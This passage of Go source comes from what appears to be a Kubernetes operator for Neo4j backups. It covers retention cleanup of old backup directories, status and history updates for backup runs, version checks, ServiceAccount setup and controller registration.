find "$BACKUP_DIR" -maxdepth 1 -mindepth 1 -type d %s -exec rm -rf {} +
echo "Removed backup directories older than %s"
`, policy.MaxAge, findArg, policy.MaxAge)
	}

	script += `echo "Retention enforcement complete"`
	return script
}

// parseFindTimeArg converts a MaxAge string (e.g. "7d", "24h") into a find(1)
// time predicate such as "-mtime +7" or "-mmin +1440".
func parseFindTimeArg(maxAge string) string {
	if len(maxAge) < 2 {
		return "-mtime +7"
	}
	unit := maxAge[len(maxAge)-1]
	n, err := strconv.Atoi(maxAge[:len(maxAge)-1])
	if err != nil || n <= 0 {
		return "-mtime +7"
	}
	switch unit {
	case 'd':
		return fmt.Sprintf("-mtime +%d", n)
	case 'h':
		return fmt.Sprintf("-mmin +%d", n*60)
	default:
		return fmt.Sprintf("-mtime +%d", n)
	}
}

func (r *Neo4jBackupReconciler) updateBackupStatus(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, phase, message string) {
	update := func() error {
		latest := &neo4jv1beta1.Neo4jBackup{}
		if err := r.Get(ctx, client.ObjectKeyFromObject(backup), latest); err != nil {
			return err
		}
		latest.Status.Phase = phase
		latest.Status.Message = message
		latest.Status.ObservedGeneration = latest.Generation
		condStatus, condReason := PhaseToConditionStatus(phase)
		SetReadyCondition(&latest.Status.Conditions, latest.Generation, condStatus, condReason, message)
		now := metav1.Now()
		switch phase {
		case "Running":
			latest.Status.LastRunTime = &now
		case "Completed":
			latest.Status.LastSuccessTime = &now
		}
		return r.Status().Update(ctx, latest)
	}
	err := retry.RetryOnConflict(retry.DefaultBackoff, update)
	if err != nil {
		log.FromContext(ctx).Error(err, "Failed to update backup status")
	}
}

// recordOneShotBackupRun appends a BackupRun entry for a completed one-shot
// Job to status.history (with dedup), and — on success — also refreshes
// the top-level status.stats summary. Called from BOTH the success and
// failure branches of handleExistingBackupJob: the scheduled (CronJob)
// path already records both outcomes via reconcileScheduledHistory, so
// without this the one-shot path was missing failure entries (recheck gap
// 2). The shared underlying builder jobToBackupRun handles the status
// string and BackupsPath consistently across both code paths.
func (r *Neo4jBackupReconciler) recordOneShotBackupRun(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, job *batchv1.Job) {
	logger := log.FromContext(ctx)

	run, ok := jobToBackupRun(job, chainRoot(backup))
	if !ok {
		// Job is neither Succeeded nor Failed — nothing terminal to record.
		// handleExistingBackupJob only calls us once one branch is true, so
		// reaching this is a programming error elsewhere, not user data.
		return
	}
	// Phase 3: stamp the per-shard audit list onto the BackupRun. No-op for
	// non-sharded kinds; failure to fetch the sharded DB CR is non-fatal.
	// F3 / F4: augment with per-shard Filename / Size AND BackupValidationResult
	// by parsing the backup Pod's neo4j-admin output. We fetch the Pod log
	// once and feed it into both parsers — Pod logs are TTL-bound, so a
	// single fetch is cheaper than separate calls. Non-fatal — log-fetch
	// failures and parse misses leave the corresponding fields empty.
	isStandardDB := backup.Spec.Target.Kind == neo4jv1beta1.BackupTargetKindDatabase
	logContent := ""
	if shouldFetchLog := r.expectedShardArtifactsForBackup(ctx, backup) != nil || isStandardDB ||
		(backup.Spec.Options != nil && backup.Spec.Options.Validate != nil && *backup.Spec.Options.Validate); shouldFetchLog {
		if got, logErr := r.fetchBackupPodLog(ctx, job.Name, job.Namespace); logErr != nil {
			logger.Info("Failed to fetch backup pod log; ShardArtifacts/ArtifactFilename/Validation may be incomplete",
				"error", logErr.Error(), "job", job.Name)
		} else {
			logContent = got
		}
	}
	if artifacts := r.expectedShardArtifactsForBackup(ctx, backup); len(artifacts) > 0 {
		if logContent != "" {
			artifacts = mergeShardArtifactsFromLog(artifacts, parseShardArtifactsFromLog(logContent))
		}
		run.ShardArtifacts = artifacts
	}
	if isStandardDB && logContent != "" {
		run.ArtifactFilename = parseStandardArtifactFromLog(logContent, backup.Spec.Target.Name)
	}
	if logContent != "" {
		if validation := parseValidationFromLog(logContent); validation != nil {
			run.Validation = validation
		}
	}
	// Size, Throughput, FileCount are intentionally omitted from run.Stats:
	// they require parsing neo4j-admin stdout from Job pod logs (future
	// enhancement). jobToBackupRun populates Duration when both StartTime
	// and CompletionTime are present, which is the success case.

	update := func() error {
		latest := &neo4jv1beta1.Neo4jBackup{}
		if err := r.Get(ctx, client.ObjectKeyFromObject(backup), latest); err != nil {
			return err
		}

		// Dedup: the terminal-phase guard in handleOneTimeBackup (issue #116)
		// already prevents repeat calls for the same Job, but record the
		// invariant explicitly here so future callers can't reintroduce
		// duplicates. The Job UID is the cheapest stable key — every retry
		// produces a new Job with a new UID. Returning nil (instead of an
		// idempotent Status.Update) saves the round-trip and the
		// resourceVersion bump on every redundant reconcile.
		if backupRunAlreadyRecorded(latest.Status.History, run) {
			return nil
		}

		// Mirror status.stats to the latest *successful* run only — Stats
		// is a "headline number" summary for dashboards; a failed run has
		// no meaningful Duration/Size to surface there. Failed runs still
		// land in history with Status=Failed.
		if run.Status == "Succeeded" && run.Stats != nil {
			latest.Status.Stats = run.Stats
		}
		latest.Status.History = append([]neo4jv1beta1.BackupRun{run}, latest.Status.History...)
		if len(latest.Status.History) > 10 {
			latest.Status.History = latest.Status.History[:10]
		}

		return r.Status().Update(ctx, latest)
	}
	if err := retry.RetryOnConflict(retry.DefaultBackoff, update); err != nil {
		logger.Error(err, "Failed to record one-shot backup run in history")
	}

	// Phase 3: reverse-lookup so the Neo4jShardedDatabase CR's
	// status.lastBackup surfaces this run. No-op for non-sharded kinds and
	// for non-Succeeded runs.
	r.updateShardedDBLastBackup(ctx, backup, run)
}

// validateNeo4jVersion validates that the target cluster uses Neo4j 5.26+ or 2025.01+
func (r *Neo4jBackupReconciler) validateNeo4jVersion(cluster *neo4jv1beta1.Neo4jEnterpriseCluster) error {
	if cluster.Spec.Image.Tag == "" {
		return fmt.Errorf("Neo4j image tag is not specified in cluster %s", cluster.Name)
	}

	return validation.ValidateNeo4jVersion(cluster.Spec.Image.Tag)
}

// backupServiceAccountName is the ServiceAccount used by all backup Job pods.
// Operators can annotate it for IRSA / GKE Workload Identity / Azure Workload Identity
// via CloudBlock.Identity.AutoCreate.Annotations.
const backupServiceAccountName = "neo4j-backup-sa"

// ensureBackupServiceAccount creates (or updates) the neo4j-backup-sa ServiceAccount
// and applies any workload-identity annotations declared in the backup spec.
// No Role or RoleBinding is created: the backup Job runs neo4j-admin directly and
// does not need any Kubernetes API access.
func (r *Neo4jBackupReconciler) ensureBackupServiceAccount(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	namespace := backup.Namespace

	// Collect workload-identity annotations from the spec (if any).
	wiAnnotations := map[string]string{}
	cloud := cloudBlockForBackup(backup)
	if cloud != nil && cloud.Identity != nil && cloud.Identity.AutoCreate != nil {
		for k, v := range cloud.Identity.AutoCreate.Annotations {
			wiAnnotations[k] = v
		}
	}

	sa := &corev1.ServiceAccount{
		ObjectMeta: metav1.ObjectMeta{
			Name:      backupServiceAccountName,
			Namespace: namespace,
		},
	}
	_, err := controllerutil.CreateOrUpdate(ctx, r.Client, sa, func() error {
		// Apply workload-identity annotations; preserve any other annotations
		// already present (e.g. set by cloud-controller or the user directly).
		if sa.Annotations == nil {
			sa.Annotations = map[string]string{}
		}
		for k, v := range wiAnnotations {
			sa.Annotations[k] = v
		}
		return nil
	})
	return err
}

// SetupWithManager sets up the controller with the Manager.
func (r *Neo4jBackupReconciler) SetupWithManager(mgr ctrl.Manager) error {
	return ctrl.NewControllerManagedBy(mgr).
		For(&neo4jv1beta1.Neo4jBackup{}).
		Owns(&batchv1.Job{}).
		Owns(&batchv1.CronJob{}).
		WithOptions(controller.Options{
			MaxConcurrentReconciles: r.MaxConcurrentReconciles,
		}).
		Complete(r)
}
